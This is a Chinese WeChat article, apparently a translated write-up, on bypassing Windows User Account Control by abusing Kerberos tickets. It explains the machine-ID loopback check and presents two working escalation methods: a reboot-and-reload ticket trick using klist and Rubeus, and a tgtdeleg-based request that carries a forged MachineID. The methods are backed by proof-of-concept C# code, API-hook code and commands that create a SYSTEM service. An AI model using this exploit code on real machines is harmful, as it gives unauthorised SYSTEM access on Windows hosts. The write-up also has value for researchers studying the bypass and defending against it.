#  翻译：通过滥用 Kerberos 票证重新访问 UAC 旁路

时光与她  [ 网络安全交流圈 ](javascript:void\(0\);)

**网络安全交流圈** ![]()

微信号 gh_6d11e0d3a78e

功能介绍 审计，渗透，二进制，kali，分享圈子。

____

___发表于_

收录于合集

![]()

##  

## 背景

本文的灵感来自 James Forshaw ( @tiraniddo )，他在 BlackHat USA 2022 上提出了题为“将 Kerberos
提升到新水平”的主题。在他的演讲中，他演示了滥用 Kerberos 票证来绕过用户帐户控制
(UAC)并且还写了一篇题为“以最复杂的方式绕过UAC！”的博文。”来解释基本原理。这引起了我的浓厚兴趣。

虽然他没有提供完整的漏洞利用代码，但我基于Rubeus构建了一个概念验证（POC） 。Rubeus 是一个 C# 工具包，专为原始 Kerberos
交互和票证滥用而设计。它提供了一个用户友好的界面，使我们能够轻松发起Kerberos请求并操作Kerberos票证。

## 想一想

用户帐户控制 (UAC)
允许用户以非管理员权限执行常见的日常任务。作为管理员组成员的用户帐户按照最小权限原则运行大多数应用程序。此外，为了更好地保护属于本地管理员组成员的用户，Microsoft
在网络上实施 UAC
限制，这有助于防止环回攻击。对于本地用户帐户（管理员除外），本地管理员组的成员无法在远程计算机上获得提升的权限。对于域用户帐户，Domain Admins
组的成员将在远程计算机上使用完全管理员访问令牌运行，并且 UAC 将不会生效。

这是因为，默认情况下，如果用户是本地管理员组的成员，LSASS（本地安全机构子系统服务）会过滤任何网络身份验证令牌以删除管理员权限。但是，如果用户是
Domain Admins 组的成员，LSASS 允许网络身份验证使用完整的管理员令牌。因此，当使用 Kerberos
进行本地身份验证时，您可能会认为这是一个简单的 UAC 绕过。如果可能的话，您所需要做的就是作为域用户向本地服务进行身份验证，以获得未经过滤的网络令牌。

然而，实际上这是不可能的。Kerberos 协议具有防止上述攻击的特定功能，确保了一定程度的安全性。如果您没有使用管理员令牌运行，则访问 SMB
环回接口不应突然授予您管理员权限，因为这可能会无意中危害系统。那么，LSASS如何判断目标服务是否位于当前机器上呢？

## Kerberos环回

早在 2021 年 1 月，微软的 Steve Syfuhs (@SteveSyfuhs) 就发表了一篇题为《通过 Kerberos Loopback 防止
UAC 绕过》的文章。文章描述了以下内容：

> “票证是由 KDC 创建的。客户无法看到其内部，也无法对其进行操作。它是不透明的。但是，客户端可以要求 KDC 在票证中包含额外的位。
>
> 这些额外的位只是在身份验证期间将信息从客户端传送到目标服务的一种方式。事实上，客户端总是要求包含的内容之一就是机器随机数。
>
> 看，当客户端向客户端 Kerberos 堆栈请求票证时，堆栈会创建一个随机数据位并将其存储在 LSA
> 中，并将其与当前登录的用户相关联。这就是随机数。这个随机数也被粘在票证中，然后由目标服务接收。
>
> 目标服务知道这个随机数，并询问 LSA 是否恰好将此随机数藏在某处。如果没有，那么，那就是另一台机器，然后照常进行。
>
> 然而，如果它确实有这个随机数，LSA 将通知 Kerberos 堆栈它最初来自某某用户，最重要的是，该用户当时没有被提升。”

这里提到的一个重要元素是“机器随机数”。如果票据中“ machine nonce
”的值可以在目标服务机器上找到，则说明发起Kerberos请求的客户端和目标服务在同一台机器上。最重要的是，这将导致 LSASS 过滤网络令牌。

我在 Microsoft 的“ [MS-KILE]：Kerberos
协议扩展”文档中记录的LSAP_TOKEN_INFO_INTEGRITY结构中找到了这个“机器随机数” 。LSAP_TOKEN_INFO_INTEGRITY
结构指定客户端完整性级别信息，该结构中的 MachineID 成员是“机器随机数”，如下所示。  

    
    
     typedef struct _LSAP_TOKEN_INFO_INTEGRITY {  
       unsigned long Flags;  
       unsigned long TokenIL;  
       unsigned char MachineID[32];  
     } LSAP_TOKEN_INFO_INTEGRITY, *PLSAP_TOKEN_INFO_INTEGRITY;

  
|  
  
---|---  
  
MachineID实际上是用于识别调用机器的ID。它是在计算机启动期间创建的，并通过随机数生成器进行初始化。换句话说，每次计算机启动时，MachineID
都会发生变化。它的实际值记录在lsasrv.dll模块的LsapGlobalMachineID全局变量中，并加载到LSASS进程空间中。

此外，微软官方文档“ [MS-KILE]: Kerberos Protocol Extensions,section 3.4.5.3Processing
Authorization Data ”还记录了以下信息：

> “服务器必须在所有 AD-IF-RELEVANT 容器中搜索 KERB_AUTH_DATA_TOKEN_RESTRICTIONS 和
> KERB_AUTH_DATA_LOOPBACK 授权数据条目。服务器可以在所有 AD-IF-RELEVANT
> 容器中搜索所有其他授权数据条目。服务器必须检查 KERB-AD-RESTRICTION-ENTRY.Restriction.MachineID
> 是否等于机器 ID。
>
>   * 如果相等，则服务器将身份验证视为本地身份验证，因为客户端和服务器位于同一台计算机上，并且可以将 KERB-LOCAL 结构
> AuthorizationData 用于任何本地实现目的。
>
>   * 否则，服务器必须忽略 KERB_AUTH_DATA_TOKEN_RESTRICTIONS 授权数据类型、KERB-AD-RESTRICTION-
> ENTRY 结构、KERB-LOCAL 以及包含的 KERB-LOCAL 结构。”
>
>

服务器必须在服务票证的
PAC（特权属性证书）结构中存在的所有容器中搜索KERB_AUTH_DATA_TOKEN_RESTRICTIONS授权数据条目。此外，它必须检查
是否等于计算机 ID
(LsapGlobalMachineID)。如果相等，则服务器认为该认证为本地认证，表明客户端和服务器在同一台计算机上。KERB_AUTH_DATA_LOOPBACKAD-
IF-RELEVANTKERB-AD-RESTRICTION-ENTRY.Restriction.MachineID

在这种情况下，LSASS 中的 Kerberos 模块调用
LSA（本地安全机构）函数，将票证结构LsaISetSupplementalTokenInfo中的信息应用到令牌。KERB-AD-RESTRICTION-
ENTRY相关代码如下所示：

  

    
    
    NTSTATUS LsaISetSupplementalTokenInfo(PHANDLE phToken,   
                            PLSAP_TOKEN_INFO_INTEGRITY pTokenInfo) {  
      // ...  
      BOOL bLoopback = FALSE:  
      BOOL bFilterNetworkTokens = FALSE;  
      
      if (!memcmp(&LsapGlobalMachineID, pTokenInfo->MachineID,  
           sizeof(LsapGlobalMachineID))) {  
        bLoopback = TRUE;  
      }  
      
      if (LsapGlobalFilterNetworkAuthenticationTokens) {  
        if (pTokenInfo->Flags & LimitedToken) {  
          bFilterToken = TRUE;  
        }  
      }  
      
      PSID user = GetUserSid(*phToken);  
      if (!RtlEqualPrefixSid(LsapAccountDomainMemberSid, user)  
        || LsapGlobalLocalAccountTokenFilterPolicy   
        || NegProductType == NtProductLanManNt) {  
        if ( !bFilterToken && !bLoopback )  
          return STATUS_SUCCESS;  
      }  
      
      /// Filter token if needed and drop integrity level.  
    }  
    

  
|  
  
---|---  
  
上述代码的执行逻辑与下图所示流程类似：

![]()‍

该LsaISetSupplementalTokenInfo函数主要执行三项检查：

  1. 第一个检查将MachineID中的字段KERB-AD-RESTRICTION-ENTRY与 LSASS 变量中存储的值进行比较LsapGlobalMachineID。如果匹配，bLoopback则设置标志。

  2. 接下来，它检查 的值LsapGlobalFilterNetworkAuthenticationTokens以过滤所有网络令牌。此时，它检查LimitedToken标志并bFilterToken相应地设置标志。默认情况下，此过滤模式通常处于禁用状态，因此bFilterToken通常不设置。

  3. 最后，代码查询当前创建的令牌所属的帐户 SID，并检查以下任一条件是否成立：

    * 用户 SID 不是本地帐户域的成员。

    * LsapGlobalLocalAccountTokenFilterPolicy非零，这会禁用本地帐户过滤。

    * NegProductTypematches NtProductLanManNt，对应于域控制器。

如果后三个条件中的任何一个为真，且token信息既没有环回，也没有强制过滤，则函数将返回成功，并且不会发生过滤。

对于令牌的完整性级别，如果正在执行过滤，则会将其降低TokenIL到KERB-AD-RESTRICTION-ENTRY.
但是，它不会将完整性级别提升到超出所创建令牌的默认完整性级别，因此不能滥用它来获得系统完整性。

## 添加虚假 MachineID

到现在为止，您可能已经有了一些了解。如果您已通过域用户身份验证，则滥用系统的最简单方法就是使 MachineID
检查失败。全局变量的值LsapGlobalMachineID是LSASS在计算机启动过程中生成的随机值。

### 重启服务器

一种方法是为本地系统生成 KRB-CRED
格式的服务票证并将其保存到磁盘。然后重新启动系统重新初始化LsapGlobalMachineID，返回系统后重新加载之前保存的票据。此时，票据将具有不同的
MachineID，Kerberos 将忽略 等限制KERB_AUTH_DATA_TOKEN_RESTRICTIONS，如 Microsoft
官方文档中所述。您可以使用 Windows 中的内置klist命令以及 Rubeus 工具包来完成此操作。

（1）首先使用命令klist获取本地服务器的HOST服务的ticket：

    
    
    klist get HOST/$env:COMPUTERNAME

![]()

(2) 使用Rubeus导出请求的服务票据：

    
    
    Rubeus.exe dump /server:$env:COMPUTERNAME /nowrap

![]()

(3) 重启服务器，将Rubeus导出的服务票据重新传回内存：

    
    
    Rubeus.exe ptt /ticket:<BASE64 TICKET> 

![]()

此时，由于票据中的 MachineID 与 LsapGlobalMachineID 值不同，因此将不再进行网络令牌过滤。您可以使用 Kerberos
身份验证来访问服务控制管理器 (SCM) 命名管道或使用 HOST/HOSTNAME 或 RPC/HOSTNAME SPN 的 TCP。需要注意的是，SCM
的 Win32 API 始终使用 Negotiate 身份验证。James Forshaw 创建了一个名为SCMUACBypass.cpp的简单概念验证
(POC) ，它挂钩 AcquireCredentialsHandle 和 InitializeSecurityContextW API，以将 SCM
使用的身份验证包名称 (pszPackage) 更改为 Kerberos，从而使 SCM 在本地身份验证期间能够使用 Kerberos，如下所示。

    
    
    SECURITY_STATUS SEC_ENTRY AcquireCredentialsHandleWHook(  
        _In_opt_  LPWSTR pszPrincipal,                // Name of principal  
        _In_      LPWSTR pszPackage,                  // Name of package  
        _In_      unsigned long fCredentialUse,       // Flags indicating use  
        _In_opt_  void* pvLogonId,                   // Pointer to logon ID  
        _In_opt_  void* pAuthData,                   // Package specific data  
        _In_opt_  SEC_GET_KEY_FN pGetKeyFn,           // Pointer to GetKey() func  
        _In_opt_  void* pvGetKeyArgument,            // Value to pass to GetKey()  
        _Out_     PCredHandle phCredential,           // (out) Cred Handle  
        _Out_opt_ PTimeStamp ptsExpiry                // (out) Lifetime (optional)  
    )  
    {  
        WCHAR kerberos_package[] = MICROSOFT_KERBEROS_NAME_W;  
        printf("AcquireCredentialsHandleHook called for package %ls\n", pszPackage);  
        if (_wcsicmp(pszPackage, L"Negotiate") == 0) {  
            pszPackage = kerberos_package;  
            printf("Changing to %ls package\n", pszPackage);  
        }  
        return AcquireCredentialsHandleW(pszPrincipal, pszPackage, fCredentialUse,  
            pvLogonId, pAuthData, pGetKeyFn, pvGetKeyArgument, phCredential, ptsExpiry);  
    }  
      
    SECURITY_STATUS SEC_ENTRY InitializeSecurityContextWHook(  
        _In_opt_    PCredHandle phCredential,               // Cred to base context  
        _In_opt_    PCtxtHandle phContext,                  // Existing context (OPT)  
        _In_opt_ SEC_WCHAR* pszTargetName,         // Name of target  
        _In_        unsigned long fContextReq,              // Context Requirements  
        _In_        unsigned long Reserved1,                // Reserved, MBZ  
        _In_        unsigned long TargetDataRep,            // Data rep of target  
        _In_opt_    PSecBufferDesc pInput,                  // Input Buffers  
        _In_        unsigned long Reserved2,                // Reserved, MBZ  
        _Inout_opt_ PCtxtHandle phNewContext,               // (out) New Context handle  
        _Inout_opt_ PSecBufferDesc pOutput,                 // (inout) Output Buffers  
        _Out_       unsigned long* pfContextAttr,  // (out) Context attrs  
        _Out_opt_   PTimeStamp ptsExpiry                    // (out) Life span (OPT)  
    )  
    {  
        // Change the SPN to match with the UAC bypass ticket you've registered.  
        printf("InitializeSecurityContext called for target %ls\n", pszTargetName);  
        SECURITY_STATUS status = InitializeSecurityContextW(phCredential, phContext, &spn[0],   
            fContextReq, Reserved1, TargetDataRep, pInput,  
            Reserved2, phNewContext, pOutput, pfContextAttr, ptsExpiry);  
        printf("InitializeSecurityContext status = %08X\n", status);  
        return status;  
    }  
      
    // ...  
      
    int wmain(int argc, wchar_t** argv)  
    {  
        // ...  
        
        PSecurityFunctionTableW table = InitSecurityInterfaceW();  
        table->AcquireCredentialsHandleW = AcquireCredentialsHandleWHook;  
        table->InitializeSecurityContextW = InitializeSecurityContextWHook;  
        
        // ...  
    }

然后，它创建一个服务并以系统权限运行它。如下图所示，成功获取SYSTEM权限。

![]()

### Tgtdeleg 技巧

另一种方法是自己生成服务票证。但是，需要注意的是，如果无法访问当前用户的凭据，我们就无法手动生成 TGT（票证授予票证）。然而，Benjamin Delpy
( @gentilkiwi ) 在他的Kekeo中引入了一种技术 (tgtdeleg) ，允许您滥用无约束委派来获取带有会话密钥的本地 TGT。

![]()

Tgtdeleg 滥用 Kerberos GSS-API 来获取当前用户的可用
TGT，而无需提升主机权限。该方法使用该AcquireCredentialsHandle函数获取当前用户的Kerberos安全凭证句柄。然后，它InitializeSecurityContext使用ISC_REQ_DELEGATE标记和目标
SPN 设置为 来调用该函数HOST/DC.domain.com，准备发送到域控制器的伪委托上下文。

这会导致 GSS-API 输出中的 KRB_AP-REQ 数据包在验证器校验和中包含
KRB_CRED。随后，它从本地Kerberos缓存中提取服务票据的会话密钥，并用它来解密Authenticator中的KRB_CRED，获得可用的TGT。

Rubeus 工具包也采用了这种技术。更具体的细节，请参阅“ Rubeus – Now With More Kekeo ”。

通过 Tgtdeleg 技术获得这个 TGT，我们可以使用以下可行的操作流程继续生成我们自己的服务票据：

  1. 使用Tgtdeleg技术获取用户的TGT。

  2. 使用 TGT 请求 KDC 为本地计算机生成新的服务票证。添加一个KERB-AD-RESTRICTION-ENTRY，但填写一个假的 MachineID。

  3. 将服务票证提交到缓存。

  4. 访问SCM（服务控制管理器）创建系统服务并绕过UAC。

## 由C#实现

为了实现上述流程，我基于 Rubeus 创建了自己的概念验证 (POC)：https://github.com/wh0amitz/KRBUAACBypass

### 主班

这里，我实现了两个功能模块。第一个是“asktgs”，用于使用伪造的 MachineID
请求服务票据。获得票据后，第二个模块“krbscm”用于访问SCM（服务控制管理器）并创建系统服务。流程如下：

‍

    
    
    private static void Run(string[] args, Options options)  
    {  
    	string method = args[0];  
    	string command = options.Command;  
    	Verbose = options.Verbose;  
      
        // Get domain controller name  
    	string domainController = Networking.GetDCName();  
        // Get the dns host name of the current host and construct the SPN of the HOST service  
    	string service = $"HOST/{Dns.GetHostName()}";  
        // Default kerberos etype  
    	Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial;  
    	string outfile = "";  
    	bool ptt = true;  
      
    	if(method == "asktgs")  
    	{  
            // Execute the tgtdeleg trick  
    		byte[] blah = LSA.RequestFakeDelegTicket();  
    		KRB_CRED kirbi = new KRB_CRED(blah);  
    		Ask.TGS(kirbi, service, requestEType, outfile, ptt, domainController);  
    	}  
      
    	if (method == "krbscm")  
    	{  
    		// extract out the tickets (w/ full data) with the specified targeting options  
    		List<LSA.SESSION_CRED> sessionCreds = LSA.EnumerateTickets(false, new LUID(), "HOST", null, null, true);  
                    
    		if(sessionCreds[0].Tickets.Count > 0)  
    		{  
    			// display tickets with the "Full" format  
    			LSA.DisplaySessionCreds(sessionCreds, LSA.TicketDisplayFormat.Klist);  
    			try  
    			{  
    				KrbSCM.Execute(command);  
    			}  
    			catch { }  
    			return;  
    		}  
    		else  
    		{  
    			Console.WriteLine("[-] Please request a HOST service ticket for the current user first.");  
    			Console.WriteLine("[-] Please execute: KRBUACBypass.exe asktgs.");  
    			return;  
    		}  
    	}  
      
    	if (method == "system")  
    	{  
    		try  
    		{  
    			KrbSCM.RunSystemProcess(Convert.ToInt32(args[1]));  
    		}  
    		catch { }  
    		return;  
    	}  
    }

### 询问

“asktgs”模块首先调用LSA.RequestFakeDelegTicket()Rubeus提供的方法来执行tgtdeleg技术。然后将返回的用户TGT以字节类型保存在变量中blah，如下所示：

    
    
    if(method == "asktgs")  
    {  
    	// Execute the tgtdeleg trick  
    	byte[] blah = LSA.RequestFakeDelegTicket();  
    	KRB_CRED kirbi = new KRB_CRED(blah);  
    	Ask.TGS(kirbi, service, requestEType, outfile, ptt, domainController);  
    }

获取到 的内容后blah，可以根据ASN.1编码规则将其初始化为KRB_CRED类型。一旦您拥有 KRB_CRED 类型形式的 TGT，您就可以添加或修改
TGT 中的元素。

> Kerberos 协议在此根据抽象语法表示法一 (ASN.1) [X680] 进行定义，它提供了一种用于指定协议消息的抽象布局及其编码的语法。

KRB_CRED 结构是一种消息格式，用于将 Kerberos 凭据从一个主体发送到另一个主体。KRB_CRED
消息包含要发送的一系列票证以及使用这些票证的必要信息，包括每个票证的会话密钥。Kerberos 协议中 KRB_CRED 结构的 ASN.1
模块定义应遵循以下形式：

    
    
    KRB-CRED        ::= [APPLICATION 22] SEQUENCE {  
            pvno            [0] INTEGER (5),  
            msg-type        [1] INTEGER (22),  
            tickets         [2] SEQUENCE OF Ticket,  
            enc-part        [3] EncryptedData -- EncKrbCredPart  
    }  
      
    EncKrbCredPart  ::= [APPLICATION 29] SEQUENCE {  
            ticket-info     [0] SEQUENCE OF KrbCredInfo,  
            nonce           [1] UInt32 OPTIONAL,  
            timestamp       [2] KerberosTime OPTIONAL,  
            usec            [3] Microseconds OPTIONAL,  
            s-address       [4] HostAddress OPTIONAL,  
            r-address       [5] HostAddress OPTIONAL  
    }  
      
    KrbCredInfo     ::= SEQUENCE {  
            key             [0] EncryptionKey,  
            prealm          [1] Realm OPTIONAL,  
            pname           [2] PrincipalName OPTIONAL,  
            flags           [3] TicketFlags OPTIONAL,  
            authtime        [4] KerberosTime OPTIONAL,  
            starttime       [5] KerberosTime OPTIONAL,  
            endtime         [6] KerberosTime OPTIONAL,  
            renew-till      [7] KerberosTime OPTIONAL,  
            srealm          [8] Realm OPTIONAL,  
            sname           [9] PrincipalName OPTIONAL,  
            caddr           [10] HostAddresses OPTIONAL  
    }

  
|  
  
---|---  
  
之后，Ask.TGS()将调用该方法来请求 TGS（服务票证）。由于我们需要KERB-AD-RESTRICTION-
ENTRY向服务票据添加新的结构，但服务票据是使用应用程序服务器的长期密钥加密的，而由于我们当前的权限而无法访问该长期密钥，因此我们只能将伪造的结构添加到服务票据中KERB-
AD-RESTRICTION-ENTRY。enc-authorization-data在构建 KRB_KDC_REQ 请求之前，KRB_KDC_REQ
消息的元素。

当KRB_KDC_REQ请求发送到KDC时，enc-authorization-dataKRB_KDC_REQ消息中的元素将被复制到enc-
part.authorization-data服务票据的元素中，并在KRB_KDC_REP消息中返回。因此，我们请求的服务票据将包含KERB-AD-
RESTRICTION-ENTRY伪造的 MachineID。

为了实现所需的功能，您可以在lib\krb_structures\TGS_REQ.cs文件中添加必要的代码，如下所示：

    
    
    if (KRBUACBypass.Program.BogusMachineID)  
    {  
        req.req_body.kdcOptions = req.req_body.kdcOptions | Interop.KdcOptions.CANONICALIZE;  
        req.req_body.kdcOptions = req.req_body.kdcOptions & ~Interop.KdcOptions.RENEWABLEOK;  
      
        // Add a KERB-AD-RESTRICTION-ENTRY but fill in a bogus machine ID.  
        // Initializes a new AD-IF-RELEVANT container  
        ADIfRelevant ifrelevant = new ADIfRelevant();  
        // Initializes a new KERB-AD-RESTRICTION-ENTRY element  
        ADRestrictionEntry restrictions = new ADRestrictionEntry();  
        // Initializes a new KERB-LOCAL element, optional  
        ADKerbLocal kerbLocal = new ADKerbLocal();  
        // Add a KERB-AD-RESTRICTION-ENTRY element to the AD-IF-RELEVANT container  
        ifrelevant.ADData.Add(restrictions);  
    	// Optional  
        ifrelevant.ADData.Add(kerbLocal);  
        // ASN.1 encode the contents of the AD-IF-RELEVANT container  
        AsnElt authDataSeq = ifrelevant.Encode(); // Encapsulate the ASN.1-encoded AD-IF-RELEVANT container into a SEQUENCE type  
        authDataSeq = AsnElt.Make(AsnElt.SEQUENCE, authDataSeq);  
        // Get the final authorization data byte array  
        byte[] authorizationDataBytes = authDataSeq.Encode();  
        // Encrypt authorization data to generate enc_authorization_data byte array  
        byte[] enc_authorization_data = Crypto.KerberosEncrypt(paEType, Interop.KRB_KEY_USAGE_TGS_REQ_ENC_AUTHOIRZATION_DATA, clientKey, authorizationDataBytes);  
        // Assign the encrypted authorization data to the enc_authorization_data field of the KRB_KDC_REQ  
        req.req_body.enc_authorization_data = new EncryptedData((Int32)paEType, enc_authorization_data);  
      
        // encode req_body for authenticator cksum  
        // Optional  
        AsnElt req_Body_ASN = req.req_body.Encode();  
        AsnElt req_Body_ASNSeq = AsnElt.Make(AsnElt.SEQUENCE, new[] { req_Body_ASN });  
        req_Body_ASNSeq = AsnElt.MakeImplicit(AsnElt.CONTEXT, 4, req_Body_ASNSeq);byte[] req_Body_Bytes = req_Body_ASNSeq.CopyValue();  
        cksum_Bytes = Crypto.KerberosChecksum(clientKey, req_Body_Bytes, Interop.KERB_CHECKSUM_ALGORITHM.KERB_CHECKSUM_RSA_MD5);  
    }

  
|  
  
---|---  
  
![]()

  

### 壁炉

明白了。您的 POC 中的功能似乎与 James Forshaw
的SCMUACBypass.cppkrbscm类似，因此无需进一步详细介绍该部分。[](https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82)

## 让我们看看它的实际效果

现在，我们来看看运行结果，如下图所示。首先，asktgs 功能用于请求当前服务器的 HOST
服务的服务票证。然后，利用krbscm创建系统服务，并授予SYSTEM权限。

    
    
    KRBUACBypass.exe asktgs -v  
    KRBUACBypass.exe krbscm

![]()

 **承接以下业务：**

![]()  

 **欢迎添加微信业务咨询：**

            ![]()

  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

